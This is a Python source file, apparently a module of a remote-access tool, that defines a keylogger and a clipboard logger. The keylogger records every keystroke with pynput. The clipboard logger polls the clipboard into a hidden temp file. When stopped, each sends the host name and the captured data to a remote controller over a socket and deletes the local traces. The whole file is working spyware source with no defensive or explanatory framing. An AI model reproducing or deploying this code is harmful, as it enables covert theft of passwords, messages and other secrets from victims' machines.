import io
import socket
import threading
import time
from pynput import keyboard
import os
import pyperclip


class KeyLogger:
    name = socket.gethostname()
    stop_event = threading.Event()
    buffer = io.StringIO()
    log_content = []
    is_running = 0
    ignore = ('Key.up', 'Key.down', 'Key.left', 'Key.right',
              'Key.ctrl_l', 'Key.ctrl_r', 'Key.shift', 'Key.caps_lock')

    def start(self, send_func, sock):
        self.stop_event.clear()
        if not self.is_running:
            send_func(str(self.is_running).encode(), sock)
            self.is_running = 1

        elif self.is_running:
            send_func(str(self.is_running).encode(), sock)
            return

        def on_press(key):
            key = str(key)
            if key == 'Key.space':
                self.log_content.append(' ')

            elif key == 'Key.enter':
                self.log_content.append('\n')

            elif key == 'Key.backspace' and self.log_content:
                self.log_content.pop(-1)

            elif key in self.ignore:
                self.log_content.append('')

            else:
                self.log_content.append(key.replace("'", ''))

        with keyboard.Listener(on_press=on_press) as listener:
            self.stop_event.wait()
            listener.stop()

    def stop(self, send_func, sock):
        if not self.is_running:
            send_func(str(self.is_running).encode(), sock)
            return

        self.stop_event.set()
        self.buffer.write(''.join(self.log_content))
        send_func(self.name.encode(), sock)
        send_func(self.buffer.getvalue().encode(), sock)
        self.log_content = []
        self.is_running = 0
        self.buffer = io.StringIO()


class ClipboardLogger:
    name = socket.gethostname()
    last_clipboard_content = ""
    is_running = 0
    stop_event = threading.Event()
    log_file_path = os.path.join(os.environ['temp'], 'clippy.log')

    def start(self, send_func, sock):
        open(rf"{self.log_file_path}", "wb").close()
        self.stop_event.clear()

        if not self.is_running:
            send_func(str(self.is_running).encode(), sock)
            self.is_running = 1

        elif self.is_running:
            send_func(str(self.is_running).encode(), sock)
            return

        while True:
            if self.stop_event.is_set():
                return

            current_clipboard_content = pyperclip.paste().strip()
            if current_clipboard_content != self.last_clipboard_content:
                with open(self.log_file_path, 'a+') as file:
                    file.write(current_clipboard_content + '\n')

            self.last_clipboard_content = current_clipboard_content
            time.sleep(1)

    def stop(self, send_func, sock):
        if not self.is_running:
            send_func(str(self.is_running).encode(), sock)
            return

        self.stop_event.set()
        if os.path.isfile(self.log_file_path):
            with open(self.log_file_path, 'rb') as file:
                data = file.read()
                send_func(self.name.encode(), sock)
                send_func(data, sock)
            self.is_running = 0
            os.remove(self.log_file_path)
            return


if __name__ == '__main__':
    keylogger = KeyLogger()
